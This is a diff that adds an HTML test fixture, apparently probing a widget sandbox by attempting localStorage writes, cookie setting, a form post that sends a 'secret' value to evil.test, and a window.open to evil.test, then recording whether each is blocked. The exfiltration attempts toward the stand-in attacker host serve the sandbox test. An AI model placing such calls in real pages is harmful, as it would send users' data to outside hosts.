@@ -1,0 +1,11 @@
+<form id="f" action="https://evil.test/f" method="post"><input name="a" value="secret"></form>
+<script>
+window.__out = {};
+(async () => {
+  await vijaya.read('list_reorder_alerts', {});
+  try { localStorage.x = 1; window.__out.ls = 'ok'; } catch (e) { window.__out.ls = e.name; }
+  try { document.cookie = 'a=1'; window.__out.cookie = document.cookie === '' ? 'empty' : 'set'; } catch (e) { window.__out.cookie = e.name; }
+  try { document.getElementById('f').submit(); window.__out.submit = 'called'; } catch (e) { window.__out.submit = e.name; }
+  try { const w = window.open('https://evil.test/p'); window.__out.open = w ? 'opened' : 'null'; } catch (e) { window.__out.open = e.name; }
+})();
+</script>
